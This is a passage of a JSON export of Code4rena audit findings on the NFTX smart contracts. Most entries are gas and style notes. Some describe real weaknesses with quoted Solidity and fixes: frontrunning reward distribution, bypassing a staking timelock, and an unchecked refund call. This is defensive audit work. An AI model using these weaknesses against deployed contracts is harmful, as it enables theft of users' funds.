implementation at [`https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code`](https://etherscan.io/address/0xa64c2f3f965f055e51482bf0960ebb5f2904bf68#code) is a more recent version than that of the previous contest review. There is no change in the storage layout between this deployed version against the one being reviewed.  The ordering of state variables is determined by the C3-linearized order of contracts, so there does not seem to have been any storage collision with the change from `OwnableUpgradeable` to `PausableUpgradeable`. It also appears that the public variables are returning expected values.  ## Recommended Mitigation Steps  Upgrading implementations are a tricky affair. It is highly recommended to use tools like OpenZeppelin\u2019s upgrade plugins that validate that the new implementation is upgrade safe and is compatible with the previous one.  "}, {"title": "NFTXStakingZap: Unused xTokenMinted variable ", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/217", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  `xTokensMinted` is assigned in `provideInventory721()` and `provideInventory1155()`, but is unused.  ## Recommended Mitigation Steps  Remove the local variable `xTokensMinted`.  "}, {"title": "Constants can be made internal / private", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Since the defined constants are unneeded elsewhere, it can be defined to be internal or private to save gas.  ## Proof of Concept ``` https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L28-L30 ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Change the visibility from public to private or internal  "}, {"title": "Use unchecked math and cache values", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/208", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact 'unchecked' directive can be used where an underflow/overflow cannot happen, e.g. here: ```solidity   if (amountEth < msg.value) {     WETH.withdraw(msg.value-amountEth);     payable(to).call{value: msg.value-amountEth};   } ``` Also, to reduce gas usage, ```msg.value-amountEth``` should be cached and not re-calculated several times.  "}, {"title": "Explicit initialization with zero not required", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/207", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Explicit initialization with zero is not required for variable declaration because uints are 0 by default. Removing this will reduce contract size and save a bit of gas.  ## Proof of Concept Instances include: ``` ./NFTXEligibilityManager.sol:85:        for (uint256 i = 0; i < modulesCopy.length; i++) { ./NFTXLPStaking.sol:81:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXLPStaking.sol:206:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXMarketplaceZap.sol:263:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:297:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:379:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:399:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:414:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:437:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXSimpleFeeDistributor.sol:62:    for (uint256 i = 0; i < length; i++) {  { ./NFTXVaultUpgradeable.sol:364:        for (uint256 i = 0; i < len; i++) { ./NFTXVaultUpgradeable.sol:406:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:419:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:442:        for (uint256 i = 0; i < amount; i++) { ```  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps Remove explicit initialization with zero.  "}, {"title": "Unused function input argument \"vault\"", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/205", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  PPrieditis   # Vulnerability details  ## Impact NFTXMarketplaceZap.sol function _buyVaultToken() has unused parameter \"vault\"  https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L497  ## Recommended Mitigation Steps Remove parameter \"vault\" from _buyVaultToken() and update necessary _buyVaultToken() calls.  "}, {"title": "`++i` costs less gass compared to `i++`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/195", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact `++i` costs less gass compared to `i++` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  ## Proof of Concept `i++` increments `i` and returns the initial value of `i`. Which means:  ``` uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ``` uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  Instances include: ``` ./NFTXEligibilityManager.sol:85:        for (uint256 i = 0; i < modulesCopy.length; i++) { ./NFTXLPStaking.sol:81:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXLPStaking.sol:206:        for (uint256 i = 0; i < vaultIds.length; i++) { ./NFTXMarketplaceZap.sol:263:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:297:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXMarketplaceZap.sol:379:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:399:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:414:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXMarketplaceZap.sol:437:    for (uint256 i = 0; i < idsIn.length; i++) { ./NFTXSimpleFeeDistributor.sol:62:    for (uint256 i = 0; i < length; i++) { ./NFTXStakingZap.sol:192:    for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXStakingZap.sol:203:    for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXStakingZap.sol:341:    for (uint256 i = 0; i < ids.length; i++) { ./NFTXVaultUpgradeable.sol:267:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:406:            for (uint256 i = 0; i < tokenIds.length; i++) { ./NFTXVaultUpgradeable.sol:419:            for (uint256 i = 0; i < tokenIds.length; i++) { ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use `++i` instead of `i++` to increment the value of an uint variable  "}, {"title": "Using 10**X for constants isn't gas efficient", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/193", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact In Solidity, a `constant` expression in a variable will compute the expression everytime the variable is called. It's not the result of the expression that is stored, but the expression itself.  As Solidity supports the scientific notation, constants of form `10**X` can be rewritten as `1eX` to save the gas cost from the calculation with the exponentiation operator `**`.  ## Proof of Concept ``` NFTXInventoryStaking.sol:   28:     uint256 public constant BASE = 10**18;  NFTXMarketplaceZap.sol:   158:   uint256 constant BASE = 10**18;  NFTXStakingZap.sol:   163:   uint256 constant BASE = 10**18;  NFTXVaultUpgradeable.sol:   33:     uint256 constant base = 10**18; ```  ## Tools Used Vs Code  ## Recommended Mitigation Steps Replace `10**18` with `1e18`  "}, {"title": "Cache storage variables in the stack can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/191", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  For the storage variables that will be accessed multiple times, cache them in the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).  For example:  - `vaultFactory` in `NFTXVaultUpgradeable#_chargeAndDistributeFees()`      https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L470-L484      ```solidity=470     function _chargeAndDistributeFees(address user, uint256 amount) internal virtual {         // Do not charge fees if the zap contract is calling         // Added in v1.0.3. Changed to mapping in v1.0.5.         if (vaultFactory.excludedFromFees(msg.sender)) {             return;         }                  // Mint fees directly to the distributor and distribute.         if (amount > 0) {             address feeDistributor = vaultFactory.feeDistributor();             // Changed to a _transfer() in v1.0.3.             _transfer(user, feeDistributor, amount);             INFTXFeeDistributor(feeDistributor).distribute(vaultId);         }     }     ```  "}, {"title": "Gas Optimization: Use immutable to cache beaconhash", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Calculation of `xTokenAddr` can further save gas by caching the creation hash as a immutable state.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L136 ``` address tokenAddr = Create2.computeAddress(salt, keccak256(type(Create2BeaconProxy).creationCode)); ```  ## Recommended Mitigation Steps ```     bytes32 internal immutable beaconhash = keccak256(type(Create2BeaconProxy).creationCode);     function xTokenAddr(address baseToken) public view virtual override returns (address) {         bytes32 salt = keccak256(abi.encodePacked(baseToken));         address tokenAddr = Create2.computeAddress(salt, beaconhash);         return tokenAddr;     } ```  "}, {"title": "Unsafe approve in NFTXSimpleFeeDistributor", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/186", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Unsafe approve was done.  ## Proof of Concept In the method `NFTXSimpleFeeDistributor._sendForReceiver` it's made a approve without checking the boolean result, ERC20 standard specify that the token can return false if the approve was not made, so it's mandatory to check the result of approve methods.  ## Tools Used Manual review  ## Recommended Mitigation Steps Use safe approve or check the boolean result  "}, {"title": "NFTXStakingZap and NFTXMarketplaceZap's transferFromERC721 transfer Cryptokitties to the wrong address", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  `transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`. It transfers to `address(this)` instead when ERC721 is Cryptokitties. As there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).  ## Proof of Concept  NFTXStakingZap: transferFromERC721 https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416  NFTXMarketplaceZap: transferFromERC721 https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556  Both functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.  ## Recommended Mitigation Steps  Fix the address:  Now: ``` // Cryptokitties. data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId); ```  To be: ``` // Cryptokitties. data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId); ```   "}, {"title": "Missing OOB check in `changeReceiverAlloc`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/181", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact `changeReceiverAlloc` did not check if the idx exists unlike other functions in the same contract  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L93 ```   function changeReceiverAlloc(uint256 _receiverIdx, uint256 _allocPoint) public override virtual onlyOwner {     FeeReceiver storage feeReceiver = feeReceivers[_receiverIdx];     allocTotal -= feeReceiver.allocPoint;     feeReceiver.allocPoint = _allocPoint;     allocTotal += _allocPoint;     emit UpdateFeeReceiverAlloc(feeReceiver.receiver, _allocPoint);   } ```  ## Recommended Mitigation Steps ```require(_receiverIdx < feeReceivers.length, \"FeeDistributor: Out of bounds\");```  "}, {"title": "Bypass zap timelock", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/178", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact The default value of `inventoryLockTime` in `NFTXStakingZap` is `7 days` while `DEFAULT_LOCKTIME` in `NFTXInventoryStaking` is 2 ms. These timelock value are used in `NFTXInventoryStaking` to eventually call `_timelockMint` in `XTokenUpgradeable`.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/token/XTokenUpgradeable.sol#L74 ```     function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {         uint256 timelockFinish = block.timestamp + timelockLength;         timelock[account] = timelockFinish;         emit Timelocked(account, timelockFinish);         _mint(account, amount);     } ```  The applicable timelock is calculated by `block.timestamp + timelockLength`, even when the existing timelock is further in the future. Therefore, one can reduce their long (e.g. 7 days) timelock to 2 ms calling `deposit` in `NFTXInventoryStaking`  ## Proof of Concept https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L160 https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L30  ## Recommended Mitigation Steps ```     function _timelockMint(address account, uint256 amount, uint256 timelockLength) internal virtual {         uint256 timelockFinish = block.timestamp + timelockLength;         if(timelockFinish > timelock[account]){             timelock[account] = timelockFinish;             emit Timelocked(account, timelockFinish);         }         _mint(account, amount);     } ```  "}, {"title": "NFTXVaultFactoryUpgradeable implementation can be replaced in production breaking the system", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/177", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  `NFTXVaultFactory` contract holds information regarding vaults, assets and permissions (vaults, _vaultsForAsset and excludedFromFees mappings). As there is no mechanics present that transfers this information to another implementation, the switch of nftxVaultFactory to another address performed while in production will break the system.  ## Proof of Concept  `setNFTXVaultFactory` function allows an owner to reset `nftxVaultFactory` without restrictions in the following contracts:  NFTXLPStaking https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L59  NFTXInventoryStaking https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXInventoryStaking.sol#L51  NFTXSimpleFeeDistributor https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L135  ## Recommended Mitigation Steps  Either restrict the ability to change the factory implementation to pre-production stages or make `nftxVaultFactory` immutable by allowing changing it only once:  Now: ``` function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {   require(newFactory != address(0));   nftxVaultFactory = INFTXVaultFactory(newFactory); } ```  To be: ``` function setNFTXVaultFactory(address newFactory) external virtual override onlyOwner {   require(nftxVaultFactory == address(0), \"nftxVaultFactory is immutable\");   nftxVaultFactory = INFTXVaultFactory(newFactory); } ```  If the implementation upgrades in production is desired, the factory data migration logic should be implemented and then used atomically together with the implementation switch in all affected contracts.   "}, {"title": "Sell event amounts[1]", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/173", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact When emitting Sell event, it assumes that the path is always of length 2, as amounts[1] is used for the ethReceived parameter. However, the path does not have any restrictions on its length, so it is completely possible, that this is not the final amount. Events are used to inform the outside world and this may trick the consumers.  ## Recommended Mitigation Steps amounts[1] should be replaced with amounts[amounts.length - 1]  "}, {"title": "max timelockLength", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/172", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Consider introducing a reasonable global upper limit for timelockLength in XTokenUpgradeable and TimelockRewardDistributionTokenImpl, so the users can't be locked out of their tokens forever.  ## Recommended Mitigation Steps XTokenUpgradeable and TimelockRewardDistributionTokenImpl should not trust the external input but have explicitly declared boundaries for values like timelock length to reduce possibilities of unexpected outcomes.  "}, {"title": "Check if amount > 0 before token transfer can save gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/165", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L247-L248  ```solidity=247 uint256 remaining = WETH.balanceOf(address(this)); WETH.transfer(to, remaining); ```  Since `WETH.balanceOf(address(this))` can to be `0`. Checking `if (remaining > 0)` before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.  "}, {"title": "Unused function parameters", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Unused function parameters increase contract size and gas usage at deployment.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L496-L511  ```solidity=496   function _buyVaultToken(     address vault,      uint256 minTokenOut,      uint256 maxWethIn,      address[] calldata path   ) internal returns (uint256[] memory) {     uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(       minTokenOut,       maxWethIn,       path,        address(this),       block.timestamp     );      return amounts;   } ```  `vault` is unused.  "}, {"title": "Unused local variables", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Unused local variables in contracts increase contract size and gas usage at deployment.  Instances include:  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L187-L187  ```solidity=187 uint256 xTokensMinted = inventoryStaking.timelockMintFor(vaultId, count*BASE, msg.sender, inventoryLockTime); ```  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L207-L207  ```solidity=207 uint256 xTokensMinted = inventoryStaking.timelockMintFor(vaultId, count*BASE, msg.sender, inventoryLockTime); ```  "}, {"title": "Unused events", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  Unused events increase contract size and gas usage at deployment.  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/eligibility/NFTXMintRequestEligibility.sol#L62-L62  ```solidity event Reject(uint256[] nftIds); ```  `Reject` is unused.  "}, {"title": "Inline unnecessary function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/159", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L285-L290  ```solidity=285     function _deposit(StakingPool memory pool, uint256 amount) internal {         require(pool.stakingToken != address(0), \"LPStaking: Nonexistent pool\");         IERC20Upgradeable(pool.stakingToken).safeTransferFrom(msg.sender, address(this), amount);         // Timelock for 2 seconds to prevent flash loans.         _rewardDistributionTokenAddr(pool).timelockMint(msg.sender, amount, 2);     } ```  https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L124-L130  ```solidity=124     function deposit(uint256 vaultId, uint256 amount) external {         onlyOwnerIfPaused(10);         // Check the pool in case its been updated.         updatePoolForVault(vaultId);         StakingPool memory pool = vaultStakingInfo[vaultId];         _deposit(pool, amount);     } ```   `_deposit()` is unnecessary as it's being used only once. Therefore it can be inlined in `deposit()` to make the code simpler and save gas.  ## Recommendation  Change to:  ```solidity=124     function deposit(uint256 vaultId, uint256 amount) external {         onlyOwnerIfPaused(10);         // Check the pool in case its been updated.         updatePoolForVault(vaultId);         StakingPool memory pool = vaultStakingInfo[vaultId];          require(pool.stakingToken != address(0), \"LPStaking: Nonexistent pool\");         IERC20Upgradeable(pool.stakingToken).safeTransferFrom(msg.sender, address(this), amount);         // Timelock for 2 seconds to prevent flash loans.         _rewardDistributionTokenAddr(pool).timelockMint(msg.sender, amount, 2);     } ```  Other examples include:  -   `NFTXFlashSwipe.sol#flashRedeem()`, `NFTXFlashSwipe.sol#flashMint()` can be inlined in `NFTXFlashSwipe.sol#onFlashLoan()` -   `UniswapV3SparkleEligibility.sol#isRare()` can be inlined in `UniswapV3SparkleEligibility.sol#_checkIfEligible()`   "}, {"title": "Outdated comment in `TimelockRewardDistributionTokenImpl.burnFrom`", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/150", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The comment in `TimelockRewardDistributionTokenImpl.burnFrom` says: > the caller must have allowance for ``accounts``'s tokens of at least `amount`.  This was the case in a previous version but not anymore. The owner does not need to be approved to burn tokens anymore.  ## Recommended Mitigation Steps Update the comment to clarify the behavior.   "}, {"title": "Low-level call return value not checked", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/140", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The `NFTXStakingZap.addLiquidity721ETHTo` function performs a low-level `.call` in `payable(to).call{value: msg.value-amountEth}` but does not check the return value if the call succeeded.  ## Impact If the call fails, the refunds did not succeed and the caller will lose all refunds of `msg.value - amountEth`.  ## Recommended Mitigation Steps Revert the entire transaction if the refund call fails by checking that the `success` return value of the `payable(to).call(...)` returns `true`.  "}, {"title": "Rewards can be stolen", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/136", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  cmichel   # Vulnerability details  The `NFTXInventoryStaking` contract distributes new rewards to all previous stakers when the owner calls the `receiveRewards` function. This allows an attacker to frontrun this `receiveRewards` transaction when they see it in the mem pool with a `deposit` function. The attacker will receive the rewards pro-rata to their deposits. The deposit will be locked for 2 seconds only (`DEFAULT_LOCKTIME`) after which the depositor can withdraw their initial deposit & the rewards again for a profit.  The rewards can be gamed this way and one does not actually have to _stake_, only be in the staking contract at the time of reward distribution for 2 seconds. The rest of the time they can be used for other purposes.  ## Recommended Mitigation Steps Distribute the rewards equally over time to the stakers instead of in a single chunk on each `receiveRewards` call. This is more of a \"streaming rewards\" approach.   "}, {"title": " Use `calldata` instead of `memory` for function parameters", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  In some cases, having function arguments in calldata instead of memory is more optimal.  Consider the following generic example:  ``` contract C { function add(uint[] memory arr) external returns (uint sum) {   uint length = arr.length;   for (uint i = 0; i < arr.length; i++) {       sum += arr[i];   } } } ``` In the above example, the dynamic array arr has the storage location memory. When the function gets called externally, the array values are kept in calldata and copied to memory during ABI decoding (using the opcode calldataload and mstore). And during the for loop, arr[i] accesses the value in memory using a mload. However, for the above example this is inefficient. Consider the following snippet instead:  ``` contract C { function add(uint[] calldata arr) external returns (uint sum) {   uint length = arr.length;   for (uint i = 0; i < arr.length; i++) {       sum += arr[i];   } } } ```  In the above snippet, instead of going via memory, the value is directly read from calldata using calldataload. That is, there are no intermediate memory operations that carries this value.  Gas savings: In the former example, the ABI decoding begins with copying value from calldata to memory in a for loop. Each iteration would cost at least 60 gas. In the latter example, this can be completely avoided. This will also reduce the number of instructions and therefore reduces the deploy time cost of the contract.  In short, use calldata instead of memory if the function argument is only read.  Note that in older Solidity versions, changing some function arguments from memory to calldata may cause \"unimplemented feature error\". This can be avoided by using a newer (0.8.*) Solidity compiler.  Examples Note: The following pattern is prevalent in the codebase:  ``` function f(bytes memory data) external { (...) = abi.decode(data, (..., types, ...)); } ```  Here, changing to bytes calldata will decrease the gas. The total savings for this change across all such uses would be quite significant.   ## Proof Of Concept  Examples:  `https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L297`  ## Tools Used  None  ## Recommended Mitigation Steps  Change memory definition with calldata.  "}, {"title": "Internal functions names should start with underscore", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/124", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Multiple internal functions do not have a name that starts with an underscore. The lack of clarity over the functions visibility could lead to misuse of these functions.  ## Proof of Concept Both the NFTXMarketplaceZap.sol and NFTXStakingZap.sol contracts have three internal functions names without underscores: approveERC721 in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L574 approveERC721 in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L434 pairFor in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L593 pairFor in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L453 sortTokens in NFTXMarketplaceZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L604 sortTokens in NFTXStakingZap.sol: https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L464  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Rename internal functions following best practices to clarify function visibility  "}, {"title": "Local variables shadowing", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/123", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  If two variables with the same name exist in a function, but one is imported from another contract while the other is created locally, it is unclear which value is being used or should be used. Avoiding variable name collisions avoids confusion and the risks of using the wrong variable.  https://swcregistry.io/docs/SWC-119  ## Proof of Concept  Several instance of this issue exist. 1. mintAndSell1155() function in NFTXMarketplaceZap.sol has `uint256[] memory amounts` as an input parameter and later it is redeclared in the function https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L368,L376 2. pauseFeeDistribution() function in NFTXSimpleFeeDistributor.sol uses a pause return bool which shadows PausableUpgradeable.pause https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L140 3. transferFromERC721() function in NFTXStakingZap.sol declares an `address owner` which shadows Ownable.owner(): https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L422 4. transferFromERC721() function in NFTXMarketplaceZap.sol declares an `address owner` which shadows Ownable.owner(): https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L562  ## Tools Used  Slither, shadowing-local detector: https://github.com/crytic/slither/wiki/Detector-Documentation#local-variable-shadowing  ## Recommended Mitigation Steps  Rename local variables to avoid shadowing. For instance, add an underscore in front of the name of local variables.  "}, {"title": "Return variable can remain unassigned in 